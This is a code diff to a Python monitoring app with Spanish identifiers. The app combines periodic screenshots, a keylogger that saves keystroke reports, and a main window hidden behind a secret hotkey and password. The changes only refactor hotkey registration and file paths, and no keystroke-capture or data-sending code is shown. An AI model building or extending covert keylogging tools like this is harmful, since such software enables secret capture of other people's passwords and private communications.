@@ -40,7 +40,8 @@ class MonitorApp:
         self.monitoreando = False
         self.intervalo_segundos = 10
         self.hilo_captura = None
-        self.ventana_login = None  
+        self.ventana_login = None
+        self.hotkey_registrada = False  
         self.keylogger_activo = False
         self.buffer_teclas = []
         self.hilo_keylogger = None
@@ -70,8 +71,14 @@ class MonitorApp:
         if not self.verificar_activacion_local():
             self.pedir_serial_activacion()
         else:
-            keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
+            self.registrar_hotkey()
             self.root.mainloop()
+
+
+    def registrar_hotkey(self):
+        if not self.hotkey_registrada:
+            keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
+            self.hotkey_registrada = True
 
     # ==================== PERSISTENCIA DE CONFIGURACIÓN ====================
 
@@ -174,7 +181,7 @@ class MonitorApp:
             if self.guardar_activacion_local():
                 messagebox.showinfo("Éxito", "Software activado correctamente de forma permanente.")
                 self.ventana_serial.destroy()
-                keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
+                self.registrar_hotkey()
             else:
                 sys.exit()
         else:
@@ -289,20 +296,10 @@ class MonitorApp:
 
     # ==================== MÉTODOS DEL KEYLOGGER ====================
 
-    def _obtener_carpeta_dia(self):
-        fecha=datetime.now().strftime("%d-%m-%Y")
-        carpeta_base=self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
-        ruta=os.path.join(carpeta_base,fecha)
-        os.makedirs(ruta, exist_ok=True)
-        return ruta
-
     def _obtener_ruta_logs(self):
         """Devuelve la ruta de la subcarpeta Logs_Teclado dentro de la carpeta de capturas actual"""
         carpeta_base = self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
-        fecha = datetime.now().strftime("%d-%m-%Y")
-        ruta=os.path.join(carpeta_base,"Logs_Teclado",fecha)
-        os.makedirs(ruta, exist_ok=True)
-        return ruta
+        return os.path.join(carpeta_base, "Logs_Teclado")
 
     def alternar_keylogger(self):
         if not self.keylogger_activo:
@@ -339,8 +336,9 @@ class MonitorApp:
             self._guardar_buffer()
 
     def _obtener_ruta_reporte(self):
-        ruta_logs=self._obtener_ruta_logs()
-        return os.path.join(ruta_logs,"Reporte_Teclado.txt")
+        fecha = date.today().strftime("%Y-%m-%d")
+        ruta_logs = self._obtener_ruta_logs()
+        return os.path.join(ruta_logs, f"Reporte_Teclado_{fecha}.txt")
 
     def _escribir_encabezado_reporte(self):
         encabezado = (
@@ -496,7 +494,8 @@ class MonitorApp:
 
     def verificar_contrasena(self):
         if self.txt_password.get() == CONTRASENA_ACCESO:
-            self.ventana_login.destroy()  
+            self.ventana_login.destroy()
+            self.ventana_login = None
             self.root.deiconify()         
         else:
             messagebox.showerror("Error", "Contraseña incorrecta. Acceso denegado.")
@@ -541,9 +540,8 @@ class MonitorApp:
     def bucle_capturas(self):
         while self.monitoreando:
             try:
-                carpeta_dia=self._obtener_carpeta_dia()
-                hora=datetime.now().strftime("%H-%M-%S")
-                ruta_completa=os.path.join(carpeta_dia,f"captura_{hora}.png")
+                ahora = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                ruta_completa = os.path.join(self.carpeta_destino, f"captura_{ahora}.png")
                 pyautogui.screenshot().save(ruta_completa)
             except:
                 pass
